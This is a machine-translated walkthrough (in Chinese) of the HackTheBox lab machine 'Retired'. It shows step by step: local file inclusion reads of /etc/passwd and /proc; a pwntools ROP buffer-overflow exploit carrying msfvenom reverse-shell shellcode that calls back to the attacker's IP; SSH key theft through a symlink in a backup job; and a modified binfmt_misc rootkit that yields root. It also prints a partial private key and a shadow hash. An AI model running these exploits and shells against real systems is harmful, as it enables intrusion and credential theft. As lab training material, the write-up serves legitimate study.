# 从 HackTheBox 退出—详细演练

> 原文：<https://infosecwriteups.com/retired-from-hackthebox-detailed-walkthrough-ee2f7cf288a?source=collection_archive---------8----------------------->

## 向您展示完成盒子所需的所有工具和技术。

[退役的](https://www.hackthebox.com/home/machines/profile/456)是由 [uco2KFh](https://www.hackthebox.com/home/users/profile/590762) 在[黑客盒子](https://www.hackthebox.com/home)上的一台中级机。它专注于二进制开发和利用设计不良的脚本和服务。

# 机器信息

![](img/5b0b0ad5b961b97826716ab1f06a2c9e.png)

从 HackTheBox 退休

我们从一个易受本地文件注入攻击的网站开始。我们用它来枚举这个盒子，并过滤出一个易受缓冲区溢出攻击的二进制文件。我花了相当多的时间来研究这个过程，因为它启用了 NX 和 RELRO。一旦我们有了一个可用的漏洞，我们就获得了一个外壳。从那里我们找到了一种获得 SSH 私有密钥的方法，然后作为一个用户，我们发现通过利用 binfmt 到 root 的路径相当简单。

# 初步侦察

像往常一样，让我们从 Nmap 开始:

![](img/074e32b861fa64f117deba8f6efa873d.png)

盒子的 nmap 扫描

我们来看看 80 端口的网站:

![](img/512d01b71908635b4dc50e1a6923bd5e.png)

端口 80 上的网站

这里没什么，但有趣的是我们有一个 index.php，它带有一个名为 **page** 的参数，该参数引用了一个 html 文件。我们可以使用 curl 来测试 default.html 是否是一个可访问的文件:

```
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# curl -sSL -D - http://10.10.11.154/default.html -o /dev/null
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 16 Jun 2022 21:07:27 GMT
Content-Type: text/html
Content-Length: 11414
Last-Modified: Wed, 13 Oct 2021 02:58:57 GMT
Connection: keep-alive
ETag: "61664b71-2c96"
Accept-Ranges: bytes
```

# Feroxbuster

我们得到一个 200 OK，在浏览器中看到的是同一个页面。使用 Feroxbuster 查找其他 html 页面的时间到了:

![](img/7efed0ada0187aea15edea40a36cf19e.png)

对网站进行 feroxbuster 扫描

# β测试场地

我们看到有一页叫做 beta.html，让我们看看:

![](img/ff2f95cf30d9555352da77d9d0849a26.png)

上传许可证密钥

有一个对话框要求输入许可证密钥文件，不管你是选择一个随机文件上传还是点击提交，你都会看到一个名为 activate_license.php 的空白页面:

![](img/69cc0cfdd4aa8739a2d73ebbc6524ff4.png)

激活许可证

我找不到任何东西，所以回到之前的参数。这给了我们 default.html 文件:

```
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# curl http://10.10.11.154/index.php?page=default.html
```

# 文件探索

让我们看看是否可以进行目录遍历来访问其他文件，如 passwd:

```
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# curl "http://10.10.11.154/index.php?page=/etc/passwd" | grep -v nologin
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1488    0  1488    0     0  27009      0 --:--:-- --:--:-- --:--:-- 27054
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
vagrant:x:1000:1000::/vagrant:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
```

我们可以，并且可以看到有一个叫 dev 的用户。现在让我们看看 activate_license.php 文件:

![](img/608157d6cc7a23683e10e7efb286e5f3.png)

激活许可 php 文件

# 枚举/proc

您可以看到它连接到本地主机端口 1337，然后将 **licensefile** 的内容写入其中。我们需要找到一种方法来利用这一点，第一步是找到在机器上的端口 1337 上运行的进程。要做到这一点，我们可以看看 [proc](https://man7.org/linux/man-pages/man5/proc.5.html) ，这是我们不久前在[后门](https://pencer.io/ctf/ctf-htb-backdoor)中提到的伪文件系统。

如果你需要更多关于 proc 如何工作的信息，这篇文章是一篇很好的文章，但是基本上一个正在运行的进程在/proc 里面会有一个相关的文件夹。我们可以使用我们读取文件的能力来遍历/proc 中的所有文件夹，寻找在端口 1337 上运行的进程。

proc 的文档告诉我们，名为 **cmdline** 的文件是我们需要的:

```
/proc/[pid]/cmdline
              This read-only file holds the complete command line for
              the process, unless the process is a zombie.
```

# 查找 PID

因此，我们希望回显每个[PID]文件夹中的文件内容:

```
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# for i in {410..415}; do curl -s http://10.10.11.154/index.php?page=/proc/$i/cmdline --output -; echo " <--" $i; done
 <-- 410
/usr/bin/activate_license1337 <-- 411
 <-- 412
 <-- 413
 <-- 414
 <-- 415
```

# 激活 _ 许可证二进制文件

这是一个缩短的循环，可以让你在数百个文件夹中等待。如你所见，有一个文件夹 **/proc/411/** ，其中包含一个名为 **cmdline** 的文件，该文件包含运行在该进程 ID [PID]上的二进制文件的路径。现在我们有了 activate_license 二进制文件的完整路径，可以下载了:

![](img/285f6c61f4c048dfcf74f071bd4ffdac.png)

活动许可证二进制文件

我们现在有 Kali 的本地文件。它是一个可执行文件，所以可以很有把握地假设我们需要找到一个像缓冲区溢出这样的漏洞。

首先检查它的安全性:

```
┌──(root㉿kali)-[~/htb/retired]
└─# checksec --file=activate_license
[*] '/root/htb/retired/activate_license'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# 缓冲区溢出

二进制文件有许多保护，包括 RELRO 和 NX 使能。我们可以利用一个漏洞来绕过这些所谓的**面向返回的编程(ROP)** ，它让我们控制程序流，即使我们不能直接写入堆栈。有很多很棒的文章向我们展示了如何使用 ROP 小工具，还有一个名为 [Pwntools](https://docs.pwntools.com/en/stable/) 的 Python 库，它使得编写我们的脚本变得更加容易。如果你需要 pwntools 的入门，那么试试 TryHackMe 上的这个免费房间。几个有用的阅读视频有[这个](https://docs.pwntools.com/en/stable/rop/rop.html)、[这个](https://fir3wa1-k3r.github.io/2020/02/13/PWNing-binary-with-NX-and-ASLR-protections-enabled.html)、[这个](https://blog.xpnsec.com/rop-primer-level-0/)和[这个](https://www.youtube.com/watch?v=ryK4Xv9Fw-o)、[这个](https://www.youtube.com/watch?v=HjiiYB4AXI8)和[这个](https://www.youtube.com/watch?v=Ge01IzQH3Rg)。

基本的想法是，我们不能像在 TryHackMe 的[缓冲区溢出室](https://pencer.io/ctf/ctf-thm-bofprep/)中那样容易地写入堆栈来控制指针。相反，我们必须使用我们想要利用的二进制文件所使用的共享目标文件中的指令。

首先我们得抓几个。所以二进制文件使用的文件。我们可以通过查看包装盒上的地图文件来了解这些信息:

```
┌──(root㉿kali)-[~/htb/retired]
└─# curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps"
```

上面使用了 [sched_debug](https://doc.opensuse.org/documentation/leap/archive/15.0/tuning/html/book.sle.tuning/cha.tuning.taskscheduler.html#sec.tuning.taskscheduler.cfs.debug) 文件来查找在机器上运行的 activate_license 二进制文件的当前 pid，然后获取它的映射文件。在这个长长的列表中，有两个文件是我们感兴趣的:

```
7f13f36a2000-7f13f36c7000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f13f3867000-7f13f3877000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
```

我们有两个共享对象的路径，让我们下载它们:

```
┌──(root㉿kali)-[~/htb/retired]
└─# curl -s "http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6" -o libsqlite3.so.0.8.6

┌──(root㉿kali)-[~/htb/retired]
└─# curl -s "http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so" -o libc-2.31.so
```

# 开拓发展

就像我们之前做的一样，第一步是找到导致二进制崩溃所需的偏移量。我们通过向它发送大量的字符，然后计算它崩溃的次数来实现这个目的。这花了我一点时间，但关键是要让二进制文件崩溃，我们必须以它期望的方式向它发送数据。为了简单起见，我将下载的 activate_license.php 文件用于 Kali，然后启动内置的 php 服务器来托管它:

```
┌──(root㉿kali)-[~/htb/retired]
└─# php -S localhost:8080
[Wed Jun 22 22:33:50 2022] PHP 8.1.2 Development Server (http://localhost:8080) started
```

运行之后，我可以把我的有效载荷发送给它，php 代码会把它写到二进制文件中。php 文件的这一部分是我们感兴趣的部分:

```
if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }
    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);
```

如您所见，它在本地写入端口 1337。因此，我们接下来要运行 activate_license 二进制文件，以便 php 脚本可以写入其中。为此，我们需要 gdb，所以当二进制崩溃时，我们可以查找寄存器来查看偏移量。

# GDB 和佩达

如果没有安装 [gdb](https://www.sourceware.org/gdb/) :

```
apt install gdb
```

还要安装 [peda](https://github.com/longld/peda) ，它向 gdb 添加了许多有用的命令:

```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

现在用 activate_license 二进制文件启动 gdb:

```
┌──(root㉿kali)-[~]
└─# gdb -q --args ./activate_license 1337
Reading symbols from ./activate_license...
```

接下来，我们需要创建一个独特的字符模式，我们将发送它来破坏二进制文件:

```
gdb-peda$ pattern_create 1000 pencer.txt
Writing pattern of 1000 chars to filename "pencer.txt"
```

现在我们可以运行二进制文件:

```
gdb-peda$ run
Starting program: /root/htb/retired/activate_license 1337
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] starting server listening on port 1337
[+] listening ...
```

所以现在我们有了托管 php 脚本的 PHP 服务器，该脚本将把我们的有效负载推送到运行在 gdb 中并监听端口 1337 的二进制文件。接下来，我们需要一个简单的 Python 脚本来发送我们刚刚创建的模式:

```
┌──(root㉿kali)-[~/htb/retired]
└─# cat pencer.py
import requests
f = open("pencer.txt", "r")
payload = f.read()
f.close()
r = requests.post(f"http://localhost:8080/activate_license.php", files = { "licensefile": payload } )
```

这只是读入包含我们在 gdb 中创建的 1000 字符模式的 txt 文件。然后它将它发送到 php 脚本，PHP 脚本将它写入运行在 gdb 中的 activate_license 二进制文件:

```
┌──(root㉿kali)-[~/htb/retired]
└─# python pencer.py
```

# 分段故障

如果我们现在切换到 gdb，我们会看到它崩溃了:

![](img/9d997d1809b597b91a888fdd9947b087.png)

显示文件崩溃的 gdb

二进制文件因分段错误而崩溃，这意味着我们溢出了缓冲区，因此现在我们可以看到偏移量是多少:

```
gdb-peda$ x/wx $rsp
0x7fffffffe2d8: 0x416a7341
gdb-peda$ pattern_offset 0x416a7341
1097495361 found at offset: 520
```

在这里，我们查看了 RSP 寄存器的内容，它给出了值 **0x416a7341** ，然后我们使用 **pattern_offset** 搜索我们创建的模式以找到该值。匹配是在 520，所以这是我们的偏移，我们将使用它来建立我们的利用脚本。

# 内存地址

如前所述，在启用 NX 的情况下，我们将使用 ROP 小工具来解决它，因此接下来我们需要知道 libc-2.31.so 和 libsqlite3.so.0.8.6 的当前内存地址。内存地址是动态的，这意味着每次重新启动机器时，地址都会发生变化，我们可以使用/proc 中的 maps 文件来获取当前值:

```
┌──(root㉿kali)-[~/htb/retired]
└─# libc_start=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "/usr/lib/x86_64-linux-gnu/libc-2.31.so" | awk -F[-] '{print $1}')

┌──(root㉿kali)-[~/htb/retired]
└─# libsqlite_start=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6" | awk -F[-] '{print $1}')
```

我们还需要堆栈地址:

```
┌──(root㉿kali)-[~/htb/retired]
└─# stack_start=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "stack" | awk -F[-] '{print $1}')

┌──(root㉿kali)-[~/htb/retired]
└─# stack_end=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "stack" | awk -F[-] '{print $2}' | cut -d ' ' -f 1)
```

记下我们脚本的值:

```
┌──(root㉿kali)-[~/htb/retired]
└─# echo $libc_start, $libsqlite_start, $stack_start, $stack_end
7fb1ff018000, 7fb1ff1dd000, 7fffddc82000, 7fffddca3000
```

# MSFVenom 外壳代码

我们还需要一个有效载荷。我们可以使用 msfvenom 创建 Python 友好格式的外壳代码，它指向我们当前的 Kali IP 和端口:

```
┌──(root㉿kali)-[~/htb/retired]
└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.198 LPORT=4444 -f py
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of py file: 373 bytes
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x0a\x0a\x0e\xc6\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
```

# 最终漏洞脚本

现在我们可以整理我们的脚本了:

```
from pwn import *
import requests

## Set Runtime variables
context.binary = './activate_license'
## Change the value of int to what we retrieved above
libc_start = int('7fb1ff018000', 16)
## Path to the binary on the box which we found earlier
libc_path = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"
## Change the value of int to what we retrieved above
libsqlite_start = int('7fb1ff1dd000', 16)
## Path to the binary on the box which we found earlier
libsqlite_path = "/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6"
## Change the value of int to what we retrieved above
stack_start = int('7fffddc82000', 16)
stack_end  = int('7fffddca3000', 16)
## Calculate length of stack
stack_length = stack_end - stack_start
## Paste shellcode from msfvenom we created earlier, make sure you have your Kali IP and port
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x0a\x0a\x0e\xc6\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
## Use pwntools to create an object of the libc-2.31.so file we downloaded
libc          = ELF("./libc-2.31.so",checksec=False)
## Set start address to value we set above
libc.address  = libc_start
## Use pwntools to create an object of the libspqlite3.so.0.8.6 file we downloaded
libsql        = ELF("./libsqlite3.so.0.8.6",checksec=False)
## Set start address to value we set above
libsql.address = libsqlite_start
## Use pwntools ROP function to create an oject containing the libc and libsql objects we created above
rop            = ROP([libc, libsql])
## Look at the symbols table for value of mprotect in the libc object we created above
mprotect = libc.symbols['mprotect']
## Look in the rop object created above for the following register addresses
pop_rdi  = rop.rdi[0]
pop_rsi  = rop.rsi[0]
pop_rdx  = rop.rdx[0]
jmp_rsp  = rop.jmp_rsp[0]
## Set offset to the value we found earlier by causing a segfault
offset  = 520
# Build payload using all of the above
payload = b'A' * offset
payload += p64(pop_rdi) + p64(stack_start)
payload += p64(pop_rsi) + p64(stack_length)
payload += p64(pop_rdx) + p64(7)
payload += p64(mprotect)
payload += p64(jmp_rsp)
payload += buf
# Post payload to the binary on the box to crash it like we did locally
requests.post('http://10.10.11.154/activate_license.php', files = { "licensefile": payload } )
```

一旦你用当前的 libc，libsql，stack 值和你的 msfvenom 外壳代码更新了它，保存它。在您选择的端口上启动 nc 侦听，然后运行脚本:

```
┌──(root㉿kali)-[~/htb/retired]
└─# python pencer_exploit.py
[*] '/root/htb/retired/activate_license'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 190 cached gadgets for './libc-2.31.so'
[*] Loaded 162 cached gadgets for './libsqlite3.so.0.8.6'
```

# 反向外壳

切换到我们等待的 nc，看看我们终于有了一个反向外壳:

```
┌──(root㉿kali)-[~/htb/retired]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.198] from (UNKNOWN) [10.10.11.154] 44748
```

第一件事总是升级到更好的 shell:

```
┌──(root㉿kali)-[~/htb/retired]
└─# nc -nlvp 4444
listening on [any] 4444 ...
/usr/bin/python3 -c 'import pty;pty.spawn("/usr/bin/bash")'
www-data@retired:/var/www$ ^Z
zsh: suspended  nc -nlvp 4444
┌──(root㉿kali)-[~/htb/retired]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 4444
www-data@retired:/var/www$ stty rows 60 cols 236
www-data@retired:/var/www$ export TERM=xterm
```

查看我们当前的文件夹会发现可疑文件:

```
www-data@retired:/var/www$ ls -l
www-data 505153 Jun 25 11:12 2022-06-25_11-12-04-html.zip
www-data 505153 Jun 25 11:13 2022-06-25_11-13-01-html.zip
www-data 505153 Jun 25 11:14 2022-06-25_11-14-04-html.zip
www-data   4096 Mar 11 14:36 html
www-data  20480 Jun 25 10:56 license.sqlite
```

创建时间相隔一分钟的三个 zip 文件表明有一个任务定期运行来创建它们。让我们搜索包含文件名中一致部分的文件:

```
www-data@retired:/var/www$ grep -r / -e '-html.zip' 2>/dev/null
/usr/bin/webbackup:DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
```

# 网站备份

我们找到一个名为 webbackup 的文件，让我们来看看:

```
www-data@retired:/var/www$ cat /usr/bin/webbackup 
#!/bin/bash
set -euf -o pipefail
cd /var/www/
SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"
KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```

这是一个简单的脚本，它将/var/www/html 的内容备份到/var/www 中的一个文件中。让我们看看是什么触发了这个脚本:

```
www-data@retired:/var/www$ grep -r /etc -e 'webbackup' 2>/dev/null
/etc/systemd/system/website_backup.service:ExecStart=/usr/bin/webbackup
```

我们可以看到 systemd 中有一个正在执行 webbackup 脚本的服务。让我们看看服务:

```
www-data@retired:/var/www$ cat /etc/systemd/system/website_backup.service
[Unit]
Description=Backup and rotate website
[Service]
User=dev
Group=www-data
ExecStart=/usr/bin/webbackup
[Install]
WantedBy=multi-user.target
```

该服务由用户 dev 运行，让我们看看/home:

```
www-data@retired:/var/www/html$ ls -l /home
drwx------ 6 dev dev 4096 Mar 11 14:36 dev
```

我们看到 dev 是唯一的用户，但我们无法深入了解。回想一开始，我们看到端口 22 在 nmap 扫描中打开。假设 dev 用户将有访问权是安全的，这可能意味着在他们的。ssh 文件夹。我们有权限在备份到 dev 主文件夹中的文件的文件夹中创建符号链接，因为脚本是在它们的上下文中运行的。所以就像我们在[封印](https://pencer.io/ctf/ctf-htb-seal/)里做的那样:

```
www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa

ww-data@retired:/var/www/html$ ls -l
-rw-rwSrw- 1 www-data www-data   585 Oct 13  2021 activate_license.php
drwxrwsrwx 3 www-data www-data  4096 Mar 11 14:36 assets
-rw-rwSrw- 1 www-data www-data  4144 Mar 11 11:34 beta.html
drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 css
-rw-rwSrw- 1 www-data www-data 11414 Oct 13  2021 default.html
lrwxrwxrwx 1 www-data www-data    21 Jun 25 11:46 id_rsa -> /home/dev/.ssh/id_rsa
-rw-rwSrw- 1 www-data www-data   348 Mar 11 11:29 index.php
drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 js
```

我们在那里看到了我们的符号链接，现在等待脚本运行。当新备份存在时，将其复制出来，这样它就不会被删除和解压缩:

```
ww-data@retired:/var/www/html$ cd /dev/shm
www-data@retired:/dev/shm$ cp /var/www/2022-06-25_11-47-04-html.zip .
www-data@retired:/dev/shm$ unzip 2022-06-25_11-47-04-html.zip 
Archive:  2022-06-25_11-47-04-html.zip
   creating: var/www/html/
   creating: var/www/html/js/
<SNIP>
```

现在，我们可以看到复制到该备份中的 id_rsa:

```
www-data@retired:/dev/shm/var/www/html$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAA
BAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEA58qqrW05/urHKC
CqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN/yfdb6Nzw5wfLeL
D4uDt8k9M7RPgkdnIRwdNFxleNHuHWmK0j7OOQ0rUsrs8LudOdk
<SNIP>
7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
-----END OPENSSH PRIVATE KEY-----
```

# SSH 作为开发人员

现在，我们可以以 dev 用户的身份将密钥粘贴到 Kali 和 ssh 上的一个文件中:

```
┌──(root㉿kali)-[~/htb/retired]
└─# nano id_rsa

┌──(root㉿kali)-[~/htb/retired]
└─# chmod 600 id_rsa         

┌──(root㉿kali)-[~/htb/retired]
└─# ssh -i id_rsa dev@10.10.11.154 
Last login: Mon Mar 28 11:36:17 2022 from 10.10.14.23
dev@retired:~$
```

在继续之前，让我们抓住用户标志:

```
dev@retired:~$ cat user.txt 
1908e78d7623086e78a6a7261db3528f
```

在我们的主文件夹中，我们发现了一个有趣的文件夹:

```
dev@retired:~$ ls -l
4 drwx------ 2 dev  dev  4096 Mar 11 14:36 activate_license
4 drwx------ 3 dev  dev  4096 Mar 11 14:36 emuemu
4 -rw-r----- 1 root dev    33 Jun 24 05:11 user.txt
```

emuemu 是什么？让我们看看:

```
dev@retired:~$ cd emuemu/
dev@retired:~/emuemu$ ls -l
-rw------- 1 dev dev   673 Oct 13  2021 Makefile
-rw------- 1 dev dev   228 Oct 13  2021 README.md
-rw------- 1 dev dev 16608 Oct 13  2021 emuemu
-rw------- 1 dev dev   168 Oct 13  2021 emuemu.c
-rw------- 1 dev dev 16864 Oct 13  2021 reg_helper
-rw------- 1 dev dev   502 Oct 13  2021 reg_helper.c
drwx------ 2 dev dev  4096 Mar 11 14:36 test
```

README.md 告诉我们一个软件模拟器，但是看看它还没有写的文件。reg_helper 二进制文件听起来很有趣，我们可以在。c 文件:

```
dev@retired:~/emuemu$ cat reg_helper.c 
#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}
```

# Binfmt 漏洞利用

这只是[从 STDIN 读入](https://linux.die.net/man/3/read)一个文件，[打开](https://linux.die.net/man/3/open)bin fmt _ misc 中的寄存器文件，然后[将](https://linux.die.net/man/3/write)写入其中。显然这需要进一步的调查，所以经过一番搜索，我在 HackTricks 上找到了[这个](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts#proc-sys-fs-binfmt_misc)，它告诉我们:

```
Poor man's rootkit, leverage binfmt_misc's credentials option to escalate privilege through any suid binary (and to get a root shell) if /proc/sys/fs/binfmt_misc/register is writeable.
```

查看寄存器文件，我们看到它只对 root 用户的所有者是可写的:

```
dev@retired:~/emuemu$ ls -ls /proc/sys/fs/binfmt_misc/register
0 --w------- 1 root root 0 Jun 24 05:11 /proc/sys/fs/binfmt_misc/register
```

这里有一个漏洞【HackTricks 向我们指出:

```
┌──(root㉿kali)-[~/htb/retired]
└─# git clone https://github.com/toffan/binfmt_misc.git
Cloning into 'binfmt_misc'...
remote: Enumerating objects: 42, done.
remote: Total 42 (delta 0), reused 0 (delta 0), pack-reused 42
Receiving objects: 100% (42/42), 17.83 KiB | 570.00 KiB/s, done.
Resolving deltas: 100% (20/20), done.

┌──(root㉿kali)-[~/htb/retired/binfmt_misc]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

把它拉到盒子旁边，运行它:

```
dev@retired:~$ wget http://10.10.14.198/binfmt_rootkit
--2022-06-25 16:45:44--  http://10.10.14.198/binfmt_rootkit
Connecting to 10.10.14.198:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2048 (2.0K) [application/octet-stream]
Saving to: ‘binfmt_rootkit’
binfmt_rootkit     100%[===========>]   2.00K  --.-KB/s    in 0s
2022-06-25 16:45:44 (350 MB/s) - ‘binfmt_rootkit’ saved [2048/2048]

dev@retired:~$ chmod +x binfmt_rootkit 

dev@retired:~$ ./binfmt_rootkit
Error: /proc/sys/fs/binfmt_misc/register is not writeable
```

我们看到的问题是，只有 root 拥有对寄存器文件的写访问权限。回到 reg_helper 二进制文件，我们看到它为我们写入了寄存器文件。我们只需要稍微改变利用方式:

```
dev@retired:~$ cp binfmt_rootkit binfmt_rootkit_pencer
dev@retired:~$ nano binfmt_rootkit_pencer
```

首先，我们可以注释掉该检查，以查看寄存器文件是否可写:

```
EOF
    exit 1
}

#function not_writeable()
#{
#       test ! -w "$mountpoint/register"
#}
```

还要注释掉调用我们刚刚注释掉的函数的那一行:

```
[[ -n "$1" ]] && usage

#not_writeable && die "Error: $mountpoint/register is not writeable"

target="$(pick_suid "$searchsuid")"
test -e "$target" || die "Error: Unable to find a suid binary in $searchsuid"
```

现在，更改最后一部分，使其调用 reg helper 二进制文件，而不是尝试写入寄存器文件:

```
chmod a+x "$fmtinterpr"

binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
echo "$binfmt_line" | /home/dev/emuemu/reg_helper

exec "$target"
```

现在，当我们运行它时，我们发现它仍然不太正确:

```
dev@retired:~$ ./binfmt_rootkit_pencer
./binfmt_rootkit_pencer: line 101: /home/dev/emuemu/reg_helper: Permission denied
umount: bad usage
Try 'umount --help' for more information.
```

当然，reg_helper 文件是由 dev 拥有的，快速查看一下就会发现它的另一个版本隐藏在其他地方:

```
dev@retired:~$ find / -name reg_helper 2>0
/usr/lib/emuemu/reg_helper
/home/dev/emuemu/reg_helper

dev@retired:~$ ls -lsa /usr/lib/emuemu/reg_helper
20 -rwxr-x--- 1 root dev 16864 Oct 13  2021 /usr/lib/emuemu/reg_helper
```

这样更好，现在只需更改我们的漏洞脚本中的代码行，改为指向该代码行:

```
echo "$binfmt_line" | /usr/lib/emuemu/reg_helper
```

最后，我们可以运行漏洞并获得一个根外壳:

```
dev@retired:~$ ./binfmt_rootkit_pencer 
uid=0(root) euid=0(root)

# cat /root/root.txt
e625876b20e8072dc89a6f64e6083a00

# cat /etc/shadow | grep root
root:$y$j9T$WTPWClbhbDs7l.UxQ36u80$ARJoOe6zhfOEca5WFBXjo4fGaxCg1Iof6qTbrfn1CzA:19062:0:99999:7:::
```

完成了。我认为这是一个相当困难的盒子，说它应该是中等，但我确实学到了一些东西，所以绝对值得。下次见。

如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)

推特—[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
网站— [https://pencer.io](https://pencer.io/)

*原载于 2022 年 8 月 27 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-retired/)*。*

## 来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周简讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 条线索、3 个视频、2 个 Github Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！